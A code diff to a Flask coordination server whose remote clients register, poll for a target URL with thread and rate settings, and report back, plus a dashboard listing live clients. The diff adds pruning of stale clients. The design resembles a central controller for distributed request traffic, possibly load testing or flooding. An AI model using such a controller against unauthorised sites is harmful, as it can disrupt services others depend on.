@@ -5,16 +5,17 @@ from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
-# ---- state ----
+STALE_AFTER = 8.0   # seconds of silence before a client is dropped from the count
+
 lock = threading.Lock()
 clients = {}          # client_id -> last_seen (epoch)
 job = {
-    "target": None,       # url
-    "threads": 0,         # how many clients to use
+    "target": None,
+    "threads": 0,
     "active": False,
-    "rate": 10,           # requests
-    "window": 3.0,        # per window (seconds)
-    "cooldown": 10.0,     # cooldown after each window (seconds)
+    "rate": 10,
+    "window": 3.0,
+    "cooldown": 10.0,
     "started_at": None,
 }
 log_lines = []
@@ -29,7 +30,16 @@ def log(msg):
     print(line)
 
 
-# ---- dashboard html (embedded) ----
+def prune_clients_locked():
+    """drop clients that haven't polled within STALE_AFTER. caller must hold lock."""
+    now = time.time()
+    dead = [cid for cid, t in clients.items() if now - t > STALE_AFTER]
+    for cid in dead:
+        del clients[cid]
+    return dead
+
+
+# ---- dashboard html ----
 DASH = """
 <!doctype html>
 <html>
@@ -53,7 +63,8 @@ DASH = """
   td,th { text-align:left; padding:6px 8px; border-bottom:1px solid #1a1a1e; }
   th { color:#555; font-weight:400; }
   .on { color:#50fa7b; } .off { color:#ff5555; }
-  pre { background:#0a0a0c; border:1px solid #1a1a1e; padding:12px; height:240px;
+  .big { font-size:28px; color:#50fa7b; }
+  pre { background:#0a0a0c; border:1px solid #1a1a1e; padding:12px; height:220px;
         overflow:auto; font-size:12px; color:#9a9a9a; border-radius:4px; }
 </style>
 </head>
@@ -81,10 +92,11 @@ DASH = """
       <table>
         <tr><th>state</th><td id="state">idle</td></tr>
         <tr><th>target</th><td id="jtarget">—</td></tr>
-        <tr><th>clients</th><td id="nclients">0</td></tr>
-        <tr><th>connected</th><td id="conn">—</td></tr>
+        <tr><th>connected</th><td><span class="big" id="nclients">0</span></td></tr>
       </table>
-      <pre id="logbox"></pre>
+      <div style="margin-top:12px;color:#555;font-size:12px">live clients</div>
+      <div id="clist" style="font-size:13px;color:#9a9a9a;margin-top:4px">—</div>
+      <pre id="logbox" style="margin-top:16px"></pre>
     </div>
   </div>
 
@@ -109,7 +121,7 @@ async function refresh(){
   document.getElementById('state').className = d.active ? 'on' : 'off';
   document.getElementById('jtarget').textContent = d.target || '—';
   document.getElementById('nclients').textContent = d.clients.length;
-  document.getElementById('conn').textContent = d.clients.map(c => c.id + ' (' + c.age + 's)').join(', ') || '—';
+  document.getElementById('clist').textContent = d.clients.map(c => c.id + ' (' + c.age + 's)').join('  |  ') || 'none';
   document.getElementById('logbox').textContent = d.log.join('\\n');
 }
 setInterval(refresh, 1500); refresh();
@@ -155,6 +167,9 @@ def api_stop():
 def api_status():
     now = time.time()
     with lock:
+        dead = prune_clients_locked()
+        for cid in dead:
+            log(f"client dropped (stale): {cid}")
         clist = [{"id": cid, "age": int(now - t)} for cid, t in clients.items()]
         return jsonify(
             active=job["active"],
@@ -168,22 +183,35 @@ def api_status():
         )
 
 
+@app.route("/api/prune", methods=["POST"])
+def api_prune():
+    with lock:
+        dead = prune_clients_locked()
+        for cid in dead:
+            log(f"client dropped (manual): {cid}")
+        alive = len(clients)
+    return jsonify(ok=True, dropped=dead, alive=alive)
+
+
 @app.route("/api/register", methods=["POST"])
 def api_register():
     data = request.get_json(force=True)
     cid = data.get("id", "unknown")
     with lock:
+        if cid not in clients:
+            log(f"client registered: {cid}")
         clients[cid] = time.time()
-    log(f"client registered: {cid}")
     return jsonify(ok=True)
 
 
 @app.route("/api/poll", methods=["POST"])
 def api_poll():
-    """client asks: what should i do right now?"""
     data = request.get_json(force=True)
     cid = data.get("id", "unknown")
     with lock:
+        prune_clients_locked()
+        if cid not in clients:
+            log(f"client registered (via poll): {cid}")
         clients[cid] = time.time()
         if job["active"] and job["target"]:
             return jsonify(
@@ -201,6 +229,10 @@ def api_report():
     data = request.get_json(force=True)
     cid = data.get("id", "?")
     msg = data.get("msg", "")
+    with lock:
+        prune_clients_locked()
+        if cid in clients:
+            clients[cid] = time.time()
     log(f"report [{cid}] {msg}")
     return jsonify(ok=True)
 
